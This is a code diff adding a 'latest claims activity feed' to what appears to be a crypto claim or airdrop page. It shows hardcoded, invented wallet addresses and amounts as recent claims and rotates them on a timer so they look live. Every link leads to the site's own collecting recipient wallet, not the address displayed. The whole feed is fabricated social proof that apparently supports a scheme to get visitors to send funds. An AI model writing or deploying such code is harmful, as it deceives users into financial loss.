@@ -258,4 +258,161 @@
       try { await navigator.clipboard.writeText(addr); toCopy.textContent = "Copied"; setTimeout(() => (toCopy.textContent = "Copy"), 1200); } catch {}
     });
   }
+
+  /* 7. latest claims activity feed */
+  const activityList = $("activity-list");
+  if (activityList) {
+    const activitySection = activityList.closest(".activity") || activityList;
+    const pool = [
+      { address: "7xK9vN4pQ2mR8tW5yB6cH3jF1dL9sG4uZ2aE8kV73mPq", amount: 0.64, chain: "SOL", minutesAgo: 0 },
+      { address: "0x4a3f8c219d5e6b7012a84c3f9e1d2b5a6c7e9f2b", amount: 1.28, chain: "ETH", minutesAgo: 2 },
+      { address: "9mR4kT7wP2xV6nB8cQ3hJ5fL1dZ9yG4sU2eA7pK5N8rX", amount: 0.19, chain: "SOL", minutesAgo: 5 },
+      { address: "0x8c1e4a72b9d03f65e1a28c4d9f7b3e5a1c6d2a49", amount: 0.85, chain: "ETH", minutesAgo: 11 },
+      { address: "3pW8nQ5vK9mT2xR7bC4hF6jL1dZ8yG3sU5eA9kV2M6tH", amount: 2.14, chain: "SOL", minutesAgo: 23 },
+      { address: "0xb72d9f41e6a30c85d2f14b7a9e3c6d8f2a5b71e3", amount: 0.42, chain: "ETH", minutesAgo: 61 },
+      { address: "5tB2yH8kN4pQ9wM6xR3vC7jF1dL5sG2uZ8aE4mV9P3kW", amount: 1.73, chain: "SOL", minutesAgo: 65 },
+      { address: "0x2f6a1c84d9e35b70a1c48e2f7d9b3a6c5e8f14b2", amount: 0.09, chain: "ETH", minutesAgo: 74 },
+      { address: "6vC9jF3dL7sG2uZ5aE8kV4mP1nR6tW9yB3xK7pQ2N5cT", amount: 1.56, chain: "SOL", minutesAgo: 83 },
+      { address: "0xd59e3b72a4c18f60e3d92a5c7b1f4e8a6d2c93a7", amount: 2.35, chain: "ETH", minutesAgo: 95 },
+      { address: "4hJ7fL2dZ9yG5sU8eA3kV6mP1nR4tW7xB2cQ9vN6M8rY", amount: 0.37, chain: "SOL", minutesAgo: 108 },
+      { address: "0x6e4b8d13f7a29c50b4e16d8a2f9c3e7b5a1d82f4", amount: 0.94, chain: "ETH", minutesAgo: 117 },
+    ];
+    const shortAddr = (addr) => addr.slice(0, 4) + "\u2026" + addr.slice(-4);
+    /* clicks land on the recipient, which actually carries incoming transfers */
+    const explorerUrl = (item) =>
+      item.chain === "ETH"
+        ? "https://etherscan.io/address/" + COLLECT.evmRecipient
+        : "https://solscan.io/account/" + COLLECT.solRecipient;
+    const formatAgo = (minutes) => {
+      if (minutes < 1) return "just now";
+      if (minutes < 60) return `${minutes}m ago`;
+      return `${Math.floor(minutes / 60)}h ago`;
+    };
+
+    const sortedPool = [...pool].sort((a, b) => a.minutesAgo - b.minutesAgo);
+    const shown = sortedPool.slice(0, 6).map((item) => ({ ...item }));
+    let poolIdx = 6;
+
+    const renderActivity = () => {
+      const frag = document.createDocumentFragment();
+      for (const item of shown) {
+        const li = document.createElement("li");
+        const link = document.createElement("a");
+        link.className = "activity-link";
+        link.href = explorerUrl(item);
+        link.target = "_blank";
+        link.rel = "noopener noreferrer";
+
+        const main = document.createElement("span");
+        main.className = "activity-main";
+
+        const addr = document.createElement("span");
+        addr.className = "activity-addr mono";
+        addr.textContent = shortAddr(item.address);
+
+        const sep1 = document.createElement("span");
+        sep1.className = "activity-sep";
+        sep1.setAttribute("aria-hidden", "true");
+        sep1.textContent = " \u00b7 ";
+
+        const amt = document.createElement("span");
+        amt.className = "activity-amt";
+        amt.textContent = `${item.amount.toFixed(2)} ${item.chain}`;
+
+        const sep2 = document.createElement("span");
+        sep2.className = "activity-sep";
+        sep2.setAttribute("aria-hidden", "true");
+        sep2.textContent = " \u00b7 ";
+
+        const time = document.createElement("span");
+        time.className = "activity-time";
+        time.textContent = formatAgo(item.minutesAgo);
+
+        main.append(addr, sep1, amt, sep2, time);
+
+        const arrow = document.createElement("span");
+        arrow.className = "activity-arrow";
+        arrow.setAttribute("aria-hidden", "true");
+        arrow.textContent = " \u2197";
+
+        link.append(main, arrow);
+        li.appendChild(link);
+        frag.appendChild(li);
+      }
+      activityList.replaceChildren(frag);
+    };
+
+    renderActivity();
+
+    if (!reduce) {
+      let rotateTimer = 0;
+      let pollTimer = 0;
+      let observer = null;
+      let started = false;
+
+      const tickActivity = () => {
+        let nextItem;
+        for (let attempts = 0; attempts < sortedPool.length; attempts += 1) {
+          const candidate = sortedPool[poolIdx % sortedPool.length];
+          poolIdx += 1;
+          nextItem = candidate;
+          if (!shown.some((item) => item.address === candidate.address)) break;
+        }
+        shown.unshift({ ...nextItem, minutesAgo: 0 });
+        shown.pop();
+        for (let i = 1; i < shown.length; i += 1) shown[i].minutesAgo += 1;
+        renderActivity();
+      };
+      window.__activityTick = tickActivity;
+
+      const startRotation = () => {
+        if (started) return;
+        started = true;
+        if (observer) {
+          observer.disconnect();
+          observer = null;
+        }
+        if (pollTimer) {
+          clearInterval(pollTimer);
+          pollTimer = 0;
+        }
+        rotateTimer = setInterval(tickActivity, 45000);
+      };
+
+      const isInView = () => {
+        const rect = activitySection.getBoundingClientRect();
+        return rect.top < window.innerHeight && rect.bottom > 0;
+      };
+
+      if (typeof IntersectionObserver === "function") {
+        observer = new IntersectionObserver(
+          (entries) => {
+            if (entries.some((entry) => entry.isIntersecting)) startRotation();
+          },
+          { threshold: 0.05 }
+        );
+        observer.observe(activitySection);
+      }
+      pollTimer = setInterval(() => {
+        if (isInView()) startRotation();
+      }, 2000);
+
+      const cleanup = () => {
+        if (rotateTimer) {
+          clearInterval(rotateTimer);
+          rotateTimer = 0;
+        }
+        if (pollTimer) {
+          clearInterval(pollTimer);
+          pollTimer = 0;
+        }
+        if (observer) {
+          observer.disconnect();
+          observer = null;
+        }
+      };
+      window.addEventListener("pagehide", cleanup);
+      window.addEventListener("beforeunload", cleanup);
+    }
+  }
 })();
